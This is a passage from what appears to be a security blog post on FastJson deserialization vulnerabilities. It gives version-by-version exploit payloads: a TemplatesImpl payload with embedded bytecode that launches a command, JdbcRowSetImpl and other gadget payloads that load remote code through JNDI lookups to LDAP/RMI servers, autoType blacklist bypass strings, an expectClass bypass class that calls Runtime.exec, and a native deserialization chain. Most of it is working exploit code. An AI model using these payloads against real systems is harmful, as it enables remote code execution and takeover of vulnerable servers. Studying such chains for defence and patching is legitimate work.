<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String exp = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMY2FsYzsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAANkb20BAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACkBAApTb3VyY2VGaWxlAQAJY2FsYy5qYXZhDAAJAAoHAC4MAC8AMAEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAMQAyAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAMwAKAQAEY2FsYwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAEwANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAMAAkAEAAMAA4ADQAPABEAEQANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj\&quot;],\&quot;_name\&quot;:\&quot;P3ngu1nW\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(exp<span class="punctuation">,</span> Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><h4 id="RMI-before-jdk8u113"><a href="#RMI-before-jdk8u113" class="headerlink" title="RMI(before jdk8u113)"></a>RMI(before jdk8u113)</h4><p>Just like JNDI, in <code>JdbcRowSetImpl#connect</code> we will call the <code>lookup</code> method.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805012734185.png" class title="image-20230805012734185">

<p>therefore, there is another chain we can exploit.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;DataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/remoteObj\&quot;, \&quot;AutoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LDAP-before-jdk8u191"><a href="#LDAP-before-jdk8u191" class="headerlink" title="LDAP(before jdk8u191)"></a>LDAP(before jdk8u191)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;DataSourceName\&quot;: \&quot;ldap://127.0.0.1:1099/remoteObj\&quot;, \&quot;AutoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bypass-jdk-limit"><a href="#bypass-jdk-limit" class="headerlink" title="bypass jdk limit"></a>bypass jdk limit</h4><p>We need to modify the server side and use the same way in the JNDI Injection.</p>
<h2 id="FastJson-1-2-25-1-2-41-Exploit"><a href="#FastJson-1-2-25-1-2-41-Exploit" class="headerlink" title="FastJson 1.2.25~1.2.41 Exploit"></a>FastJson 1.2.25~1.2.41 Exploit</h2><p>FastJson1.2.25 introduced <code>checkAutoType</code> , and default off <code>autoTypeSupport</code>, so it can not deserialize any class. Even if <code>AutoType</code> is turned on, there is a built-in blacklist to prevent malicious deserialization. fastjson also provides an interface to add a blacklist.</p>
<p>Enable <code>autoTypeSupport</code>: <code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
<p>When <code>autoTypeSupport</code> is enabled, the whitelist is checked first, and if it hits, the class is loaded directly, and then the blacklist is checked.</p>
<ul>
<li><p>denylist</p>
<img src="/2023/08/04/FastJsonSec/image-20230805131713035.png" class title="image-20230805131713035"></li>
</ul>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>use <code>L</code> and <code>;</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;, \&quot;DataSourceName\&quot;: \&quot;ldap://127.0.0.1:8099/remoteObj\&quot;, \&quot;AutoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>First, <code>Lcom.sun.rowset.JdbcRowSetImpl;</code> is not in the blacklist, so it can pass the check.</p>
<p>In <code>TypeUtils#loadClass</code>, if a class start with <code>L</code> and end with <code>;</code>, it will load the class among them.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805133056366.png" class title="image-20230805133056366">

<h2 id="FastJson-1-2-25-1-2-42-Exploit"><a href="#FastJson-1-2-25-1-2-42-Exploit" class="headerlink" title="FastJson 1.2.25~1.2.42 Exploit"></a>FastJson 1.2.25~1.2.42 Exploit</h2><p>Starting with version 1.2.42, Fastjson has changed the blacklist from plaintext to a hashed blacklist.</p>
<p>we can use the double <code>L</code> and double <code>;</code> to bypass</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;, \&quot;DataSourceName\&quot;: \&quot;ldap://127.0.0.1:8099/remoteObj\&quot;, \&quot;AutoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="FastJson-1-2-25-1-2-43-Exploit"><a href="#FastJson-1-2-25-1-2-43-Exploit" class="headerlink" title="FastJson 1.2.25~1.2.43 Exploit"></a>FastJson 1.2.25~1.2.43 Exploit</h2><p>This version checks that an exception is thrown if the class name begins with <code>LL</code></p>
<p>So we can use <code>[</code> to bypass</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[, &#123;\&quot;DataSourceName\&quot;: \&quot;ldap://127.0.0.1:8099/remoteObj\&quot;, \&quot;AutoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="FastJson-1-2-25-1-2-45-Exploit"><a href="#FastJson-1-2-25-1-2-45-Exploit" class="headerlink" title="FastJson 1.2.25~1.2.45 Exploit"></a>FastJson 1.2.25~1.2.45 Exploit</h2><p><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code> can bypass the blacklist</p>
<p>require mybatis 3.x.x &lt; 3.5.0</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span></span><br><span class="line">	<span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:8099/remoteObj&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="FastJson-1-2-25-1-2-47-Exploit-Bypass-AutoType"><a href="#FastJson-1-2-25-1-2-47-Exploit-Bypass-AutoType" class="headerlink" title="FastJson 1.2.25~1.2.47 Exploit (Bypass AutoType)"></a>FastJson 1.2.25~1.2.47 Exploit (Bypass AutoType)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span></span><br><span class="line">                + <span class="string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span></span><br><span class="line">                + <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8099/remoteObj\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In <code>ParserConfig#checkAutoType</code>, we can see if we don’t enable the <code>autoTypeSupport</code> and the target class is not in the whitelist, we will first call the  <code>TypeUtils.getClassFromMapping</code> to fetch the class.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805160902499.png" class title="image-20230805160902499">

<p>if we deserialize a <code>Class.class</code> and set another class into the field <code>val</code>, we will load the class, and put it into the map.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805161402128.png" class title="image-20230805161402128">

<img src="/2023/08/04/FastJsonSec/image-20230805161612800.png" class title="image-20230805161612800">

<p>so we can bypass the blacklist and without the <code>autoTypeSupport</code></p>
<p>The fix in 1.2.48 is to set the cache switch to False by default when loadingClass(), so by default it’s not possible to load into the cache via Class. Also added Class class to the blacklist.</p>
<h2 id="FastJson-1-2-5-1-2-59-Exploit"><a href="#FastJson-1-2-5-1-2-59-Exploit" class="headerlink" title="FastJson 1.2.5~1.2.59 Exploit"></a>FastJson 1.2.5~1.2.59 Exploit</h2><p>Need <code>AutoType</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="FastJson-1-2-5-1-2-60-Exploit"><a href="#FastJson-1-2-5-1-2-60-Exploit" class="headerlink" title="FastJson 1.2.5~1.2.60 Exploit"></a>FastJson 1.2.5~1.2.60 Exploit</h2><p>Do not need <code>AutoType</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;xaDataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="punctuation">,</span><span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="FastJson-1-2-62-Exploit"><a href="#FastJson-1-2-62-Exploit" class="headerlink" title="FastJson 1.2.62 Exploit"></a>FastJson 1.2.62 Exploit</h2><p>need <code>autotype</code></p>
<p>the target should have the <code>xbean-reflect</code> package</p>
<p>Another JNDI Injection</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,&quot;</span> + </span><br><span class="line">                <span class="string">&quot;\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:8099/remoteObj\&quot;&#125;&quot;</span>; </span><br></pre></td></tr></table></figure>

<h2 id="FastJson-1-2-66-Exploit"><a href="#FastJson-1-2-66-Exploit" class="headerlink" title="FastJson 1.2.66 Exploit"></a>FastJson 1.2.66 Exploit</h2><p>need <code>autotype</code></p>
<p>Another JNDI Injection</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="attr">&quot;Realms&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.util.Properties&quot;</span><span class="punctuation">,</span><span class="attr">&quot;UserTransaction&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="FastJson-1-2-67-Exploit"><a href="#FastJson-1-2-67-Exploit" class="headerlink" title="FastJson 1.2.67 Exploit"></a>FastJson 1.2.67 Exploit</h2><p>need <code>autotype</code></p>
<p>Another JNDI Injection</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="attr">&quot;tm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.tm&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;resourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;instance&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.instance&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="FastJson-1-2-68-Exploit-Using-expectClass-Bypass-AutoType"><a href="#FastJson-1-2-68-Exploit-Using-expectClass-Bypass-AutoType" class="headerlink" title="FastJson 1.2.68 Exploit (Using expectClass Bypass AutoType)"></a>FastJson 1.2.68 Exploit (Using expectClass Bypass AutoType)</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;VulAutoCloseable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span><span class="string">&quot;open -a calculator&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>VulAutoCloseable</code> is our malicious class that implements the <code>AutoCloseable</code> interface.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The first <code>@type</code>is used as the expectClass inside the second specified class.</p>
<h3 id="Code-Analysing"><a href="#Code-Analysing" class="headerlink" title="Code Analysing"></a>Code Analysing</h3><img src="/2023/08/04/FastJsonSec/image-20230805203803915.png" class title="image-20230805203803915">

<p>Let’s enter into the <code>checkAutoType</code>.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805204107155.png" class title="image-20230805204107155">

<p>Here check the exceptClass.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805204313793.png" class title="image-20230805204313793">

<p>Finally we get the class <code>java.lang.AutoCloseable</code> from the mappings.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805204407754.png" class title="image-20230805204407754">

<p>And return the class.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805204622397.png" class title="image-20230805204622397">

<p>Next time, we enter into the <code>checkAutoType</code>, we have a <code>expectClass</code></p>
<img src="/2023/08/04/FastJsonSec/image-20230805204710853.png" class title="image-20230805204710853">

<p>Therefore, <code>expectClassFlag = true</code></p>
<img src="/2023/08/04/FastJsonSec/image-20230805205534911.png" class title="image-20230805205534911">

<p>And here we read the target class into the memory.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805205919968.png" class title="image-20230805205919968">

<p>And here we load the target class.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805210202373.png" class title="image-20230805210202373">

<p>Our evil class has been put into the map.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805210502088.png" class title="image-20230805210502088">

<p>And we finally deserialize the target class and RCE.</p>
<h3 id="Realworld-Exploit"><a href="#Realworld-Exploit" class="headerlink" title="Realworld Exploit"></a>Realworld Exploit</h3><p>We can use this trick to read any file.</p>
<p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a></p>
<h2 id="FastJson-with-Native-Deserialization"><a href="#FastJson-with-Native-Deserialization" class="headerlink" title="FastJson with Native Deserialization"></a>FastJson with Native Deserialization</h2><h3 id="FastJson-lt-x3D-1-2-48"><a href="#FastJson-lt-x3D-1-2-48" class="headerlink" title="FastJson &lt;&#x3D; 1.2.48"></a>FastJson &lt;&#x3D; 1.2.48</h3><p>In Fastjson, <code>JSONArray</code> and <code>JSONObject</code> both implement the Serializable interface, and the <code>toString</code> method of both classes can trigger a call <code>toJSONString</code></p>
<p>So there exists an interesting chain:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toString(e.g. BadAttributeValueExpException#readObject) -&gt; toJSONString -&gt; evil getter(e.g. TemplatesImpl#getOutputProperties)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;P3ngu1nW&quot;</span>);</span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Files.readAllBytes(Paths.get(<span class="string">&quot;calc.class&quot;</span>))&#125;);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        json.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line">        field = BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, json);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span 